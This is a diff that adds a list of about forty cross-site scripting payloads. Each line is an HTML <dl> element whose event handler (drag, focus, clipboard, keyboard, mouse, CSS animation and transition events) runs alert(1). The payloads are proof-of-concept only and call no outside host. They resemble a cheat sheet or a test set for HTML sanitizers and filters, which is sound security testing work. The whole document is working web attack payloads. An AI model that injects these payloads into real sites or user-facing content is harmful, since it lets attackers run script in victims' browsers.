@@ -1,0 +1,40 @@
+<dl draggable="true" ondrag="alert(1)">test</dl>
+<dl draggable="true" ondragend="alert(1)">test</dl>
+<dl draggable="true" ondragenter="alert(1)">test</dl>
+<dl draggable="true" ondragleave="alert(1)">test</dl>
+<dl draggable="true" ondragstart="alert(1)">test</dl>
+<dl id=x tabindex=1 onactivate=alert(1)></dl>
+<dl id=x tabindex=1 onbeforeactivate=alert(1)></dl>
+<dl id=x tabindex=1 onbeforedeactivate=alert(1)></dl><input autofocus>
+<dl id=x tabindex=1 ondeactivate=alert(1)></dl><input id=y autofocus>
+<dl id=x tabindex=1 onfocus=alert(1)></dl>
+<dl id=x tabindex=1 onfocusin=alert(1)></dl>
+<dl onbeforecopy="alert(1)" contenteditable>test</dl>
+<dl onbeforecut="alert(1)" contenteditable>test</dl>
+<dl onbeforepaste="alert(1)" contenteditable>test</dl>
+<dl onblur=alert(1) tabindex=1 id=x></dl><input autofocus>
+<dl onclick="alert(1)">test</dl>
+<dl oncontextmenu="alert(1)">test</dl>
+<dl oncopy="alert(1)" contenteditable>test</dl>
+<dl oncut="alert(1)" contenteditable>test</dl>
+<dl ondblclick="alert(1)">test</dl>
+<dl onfocusout=alert(1) tabindex=1 id=x></dl><input autofocus>
+<dl onkeydown="alert(1)" contenteditable>test</dl>
+<dl onkeypress="alert(1)" contenteditable>test</dl>
+<dl onkeyup="alert(1)" contenteditable>test</dl>
+<dl onmousedown="alert(1)">test</dl>
+<dl onmouseenter="alert(1)">test</dl>
+<dl onmouseleave="alert(1)">test</dl>
+<dl onmousemove="alert(1)">test</dl>
+<dl onmouseout="alert(1)">test</dl>
+<dl onmouseover="alert(1)">test</dl>
+<dl onmouseup="alert(1)">test</dl>
+<dl onpaste="alert(1)" contenteditable>test</dl>
+<style>:target {color: red;}</style><dl id=x style="transition:color 10s" ontransitioncancel=alert(1)></dl>
+<style>:target {color:red;}</style><dl id=x style="transition:color 1s" ontransitionend=alert(1)></dl>
+<style>:target {transform: rotate(180deg);}</style><dl id=x style="transition:transform 2s" ontransitionrun=alert(1)></dl>
+<style>@keyframes slidein {}</style><dl style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></dl>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dl id=x style="position:absolute;" onanimationcancel="alert(1)"></dl>
+<style>@keyframes x{}</style><dl style="animation-name:x" onanimationend="alert(1)"></dl>
+<style>@keyframes x{}</style><dl style="animation-name:x" onanimationstart="alert(1)"></dl>
+<svg><dl onload=alert(1)></dl>
